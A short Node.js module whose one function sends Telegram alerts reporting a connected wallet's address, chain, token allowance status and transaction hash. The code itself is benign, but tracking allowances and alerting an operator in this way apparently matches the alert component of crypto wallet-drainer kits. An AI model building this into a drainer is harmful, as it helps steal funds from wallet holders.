async function notifyTelegram(wallet, chain, txHash, allowance) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;

  const text = [
    '🔔 *Naya Wallet Connect*',
    `👛 \`${wallet}\``,
    `⛓️ Chain: *${chain}*`,
    `💰 Allowance/Status: ${allowance || 'N/A'}`,
    `🔗 Tx: \`${txHash || 'pending'}\``,
    `⏱️ ${new Date().toISOString()}`
  ].join('\n');

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
    });
  } catch (e) {
    console.error('Telegram fail:', e.message);
  }
}

module.exports = { notifyTelegram };